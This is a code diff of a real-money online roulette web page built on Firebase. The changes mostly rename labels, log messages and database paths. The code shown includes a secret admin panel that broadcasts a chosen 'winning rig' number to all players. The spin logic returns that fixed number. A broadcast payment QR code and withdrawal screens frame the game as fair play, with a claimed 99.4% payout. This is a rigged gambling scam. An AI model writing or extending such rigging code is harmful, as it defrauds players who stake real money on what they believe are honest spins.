@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - UNBREAKABLE GLOBAL BROADCAST 2026</title>
+    <title>ROYAL ROULETTE - ABSOLUTE GLOBAL SYNC ENGINE</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -44,7 +44,7 @@
         .login-btn { width: 100%; padding: 8px; margin-top: 4px; background: linear-gradient(135deg, #ffd700, #b8860b); color: #000000; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; font-size: 11px; text-transform: uppercase; }
         .login-btn.lobby { background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; border: 1.5px solid #ffd700; }
         .footer-wrap { width: 100%; max-width: 360px; display: flex; flex-direction: column; gap: 2px; z-index: 5; margin-bottom: 2px; }
-        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid rgba(0,255,0,0.5); }
+        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid #002500; }
         .trust-badges { font-size: 7px; color: #ffd700; font-weight: bold; }
 
         #gameLobbyScreen { display: none; width: 100%; height: 100%; position: fixed; top: 0; left: 0; background: radial-gradient(circle, #013b12 0%, #001205 70%, #000301 100%); z-index: 20000; flex-direction: column; justify-content: space-between; padding: 2px; box-shadow: inset 0 0 100px rgba(0,0,0,0.9); border: 4px solid #24140c; }
@@ -157,8 +157,8 @@
 <body>
 
     <div id="mobileDebugConsole">
-        <b>[PUBLIC OPEN SYNC ENGINE ACTIVE]</b><br>
-        <span id="consoleLogs">Connecting to public database root...<br></span>
+        <b>[MASTER SYNC FORCE BRIDGE ACTIVE]</b><br>
+        <span id="consoleLogs">Connecting to Firebase Cloud...<br></span>
     </div>
     <script>
         function logToScreen(msg, isErr=false) {
@@ -179,11 +179,11 @@
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_PUBLIC_OPEN_V9";
+                const BUILD_VER = "ROYAL_2026_MASTER_FORCE_V10";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
-                    logToScreen("Cache cleared for open sync bridge.");
+                    logToScreen("Cache wiped for absolute force sync.");
                 }
             } catch(e) {}
         })();
@@ -219,12 +219,12 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">PUBLIC OPEN GLOBAL BROADCAST • ⚡</div>
+            <div class="trust-banner">ABSOLUTE GLOBAL SYNC ENGINE • ⚡</div>
             <div class="royal-title-wrap">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 GLOBAL LINK: ACTIVE</span>
+                <span>🟢 GLOBAL LIVE: ACTIVE</span>
                 <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
@@ -362,16 +362,15 @@
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 PUBLIC GLOBAL ADMIN PANEL</h2>
+                <h2>👑 MASTER ADMIN PANEL</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
-            <!-- QR FILE UPLOADER & URL OPTION -->
             <div style="background: rgba(0,30,15,0.95); padding: 12px; border: 2px solid #00ffcc; border-radius: 8px;">
                 <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 BROADCAST QR CODE (FILE UPLOAD OR URL)</p>
                 <input type="file" id="adminQrImageFile" accept="image/*" style="width: 100%; padding: 6px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
                 <input type="text" id="adminQrUrlInput" placeholder="OR Paste direct image URL here..." style="width: 100%; padding: 7px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
-                <button onclick="window.broadcastQrCodeGlobal()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Broadcast QR to All Users Worldwide</button>
+                <button onclick="window.broadcastQrCodeGlobal()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Broadcast QR to All Users</button>
             </div>
 
             <div style="background: rgba(30,20,5,0.95); padding: 12px; border: 2px solid #ffaa00; border-radius: 8px;">
@@ -428,7 +427,7 @@
                 <select id="adminRigSelect" style="margin-bottom: 8px;">
                     <option value="random">Auto 5% House Margin Safe Engine (No Loss)</option>
                 </select>
-                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Broadcast Winning Rig to All Users</button>
+                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Broadcast Winning Number to All Users</button>
             </div>
         </div>
     </div>
@@ -472,6 +471,7 @@
     </div>
 
     <!-- विड्रॉल मोडल -->
+    <div id="depositModalBox" class="wallet-modal">...</div>
     <div id="withdrawModalBox" class="wallet-modal">
         <div class="wallet-modal-content">
             <h3 style="color:#f1c40f; margin-bottom:6px; font-size:16px;">VIP WITHDRAWAL (REAL MONEY)</h3>
@@ -515,18 +515,18 @@
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
-                logToScreen("Public Open Firebase Connected.");
+                logToScreen("Master Firebase Connected.");
             }
         } catch(e) {
             logToScreen("Init Error: " + e.message, true);
         }
 
-        // Public Shared Root References (सभी यूजर्स के लिए एक ही ओपन पाथ)
-        const sharedRoot = firebase.database().ref("public_open_game_engine");
-        const qrRef = sharedRoot.child("admin_qr");
-        const rigRef = sharedRoot.child("admin_rig");
-        const historyRef = sharedRoot.child("history_list");
-        const membersRef = sharedRoot.child("online_members");
+        // Direct Global Root Refs
+        const dbRoot = firebase.database().ref("global_sync_root");
+        const qrRef = dbRoot.child("qr");
+        const rigRef = dbRoot.child("rig");
+        const historyRef = dbRoot.child("history");
+        const membersRef = dbRoot.child("members");
 
         (function() {
             try {
@@ -548,13 +548,13 @@
                     onlineMembers: {}
                 };
 
-                // --- GLOBAL REALTIME LISTENERS (पूरी दुनिया के सभी यूजर्स के लिए लाइव) ---
+                // --- ABSOLUTE FORCE LISTENERS ---
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
                         window.globalState.adminQrUrl = val;
                         updateActiveQrDisplay();
-                        logToScreen("[SYNC] QR Code updated for all users.");
+                        logToScreen("[SYNC] QR updated globally from Cloud.");
                     }
                 });
 
@@ -562,7 +562,7 @@
                     let val = snap.val();
                     if (val !== null) {
                         window.globalState.adminRig = val;
-                        logToScreen("[SYNC] Winning Rig updated for all users -> " + val);
+                        logToScreen("[SYNC] Rig command synced -> " + val);
                     }
                 });
 
@@ -635,15 +635,15 @@
                         reader.onload = function(e) {
                             let base64Img = e.target.result;
                             qrRef.set(base64Img).then(() => {
-                                alert("✅ QR Image File Broadcasted to All Users!");
-                                logToScreen("[SUCCESS] QR file broadcasted globally.");
+                                alert("✅ QR Image File Broadcasted Globally!");
+                                logToScreen("[SUCCESS] QR file pushed to Cloud.");
                             }).catch(err => { logToScreen("[ERR] " + err.message, true); });
                         };
                         reader.readAsDataURL(fileInput.files[0]);
                     } else if (urlInput) {
                         qrRef.set(urlInput).then(() => {
-                            alert("✅ QR URL Broadcasted to All Users!");
-                            logToScreen("[SUCCESS] QR URL broadcasted globally.");
+                            alert("✅ QR URL Broadcasted Globally!");
+                            logToScreen("[SUCCESS] QR URL pushed to Cloud.");
                         }).catch(err => { logToScreen("[ERR] " + err.message, true); });
                     } else {
                         alert("Please select a QR file or enter a direct image URL!");
@@ -672,7 +672,6 @@
                 }
 
                 function getSmartWinnerForRound(roundId) {
-                    // अब यह एडमिन के द्वारा सेट किए गए ग्लोबल रिग नंबर को सभी यूजर्स के लिए पकड़ेगा
                     if (window.globalState.adminRig !== "random") {
                         let parsedNum = parseInt(window.globalState.adminRig);
                         if (!isNaN(parsedNum)) return parsedNum;
@@ -818,10 +817,10 @@
                 
                 window.saveAdminSettings = function() {
                     let sel = document.getElementById('adminRigSelect').value;
-                    logToScreen("[ADMIN] Broadcasting Winning Rig to all users...");
+                    logToScreen("[ADMIN] Broadcasting winning number globally...");
                     rigRef.set(sel).then(() => {
-                        alert(`✅ Winning Number '${sel}' Broadcasted to All Users!`);
-                        logToScreen("[SUCCESS] Winning Rig synced globally.");
+                        alert(`✅ Winning Number '${sel}' Broadcasted Successfully!`);
+                        logToScreen("[SUCCESS] Rig synced for all users.");
                         document.getElementById('secretAdminModal').style.display = 'none';
                     }).catch(err => {
                         logToScreen("[ERR] Rig broadcast failed: " + err.message, true);
@@ -1016,7 +1015,6 @@
                     let spinAudio = document.getElementById('spinSfx');
                     if(spinAudio) spinAudio.play().catch(e => {});
 
-                    // अब यह पूरे विश्व के सभी यूजर्स के लिए एक ही फिक्स मास्टर विनिंग नंबर पकड़ेगा
                     let winningNum = getSmartWinnerForRound(endedRoundId);
                     
                     let totalPockets = numbersList.length;
